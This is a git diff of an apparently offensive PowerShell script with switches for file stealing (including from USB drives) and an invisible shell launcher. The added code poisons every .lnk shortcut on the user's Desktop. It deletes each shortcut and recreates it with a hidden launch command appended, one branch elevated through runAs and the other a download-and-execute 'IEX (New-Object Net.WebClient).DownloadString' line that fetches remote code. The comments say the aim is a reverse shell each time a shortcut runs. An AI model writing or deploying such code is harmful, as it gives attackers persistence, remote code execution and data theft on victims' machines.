@@ -7,6 +7,12 @@ $invisile_shell_launcher='yes'
 $poison_shortcuts='yes'
 $shortcut_privesc='no'
 
+# .exe Section:
+$poison_edge='no'
+$poison_ie='no'
+$poison_file_explorer='no'
+$poison_chrome='no'
+
 # File Stealing Section:
 $steal_files_enabled='yes'
 $steal_files_usb='yes'
@@ -29,7 +35,6 @@ If ($invisile_shell_launcher -eq 'yes') {
   robocopy "$PSScriptRoot\i.vbs" $invis_target
   robocopy "$PSScriptRoot\a.cmd" $invis_target
   robocopy "$PSScriptRoot\z.vbs" $invis_target
-  $shortcut_launch_script='powershell "$Env:UserProfile\temp\a.cmd"'
 }
 
 
@@ -48,7 +53,37 @@ If ($steal_files_usb -eq 'yes') {
 # Shortcut section (oh this is going to get complicated...)
 
 If ($poison_shortcuts -eq 'yes'  -AND $shortcut_privesc -eq 'yes') {
-  
-} ElseIf ($poison_shortcuts -eq 'yes') {
 
+  # So basically, what this does is it recusively goes through the Desktop, looking for .lnk files, and appends the launch script to get a reverse shell every time the shortcut is executed
+
+  $shortcut_launch_script='powershell Start-Process powershell -Verb runAs -W Hidden "$Env:UserProfile\temp\a.cmd"'
+  # Call wscript com object
+  $shell = new-object -com wscript.shell
+
+  # Recurse through directories for .lnk files
+  dir "$Env:UserProfile\Desktop" -filter *.lnk -recurse | foreach {
+  $lnk = $shell.createShortcut($_.fullname)
+  $oldPath= $lnk.targetPath
+
+  remove-item $_.fullname
+  $lnknew = $shell.createShortcut($_.fullname)
+  $lnknew.targetPath = $lnknew.targetPath + $shortcut_launch_script
+  $lnknew.Save()
+  }
+} ElseIf ($poison_shortcuts -eq 'yes') {
+  # Calls a.cmd to silently execute the reverse shell
+  $shortcut_launch_script="powershell -ExecutionPolicy Unrestricted -W Hidden `"IEX (New-Object Net.WebClient).DownloadString('https://rawgit.com/name/repository/branch/file');`""
+  # Call wscript com object
+  $shell = new-object -com wscript.shell
+
+  # Recurse through directories for .lnk files
+  dir "$Env:UserProfile\Desktop" -filter *.lnk -recurse | foreach {
+  $lnk = $shell.createShortcut($_.fullname)
+  $oldPath= $lnk.targetPath
+
+  remove-item $_.fullname
+  $lnknew = $shell.createShortcut($_.fullname)
+  $lnknew.targetPath = $oldPath + $shortcut_launch_script
+  $lnknew.Save()
+  }
 }
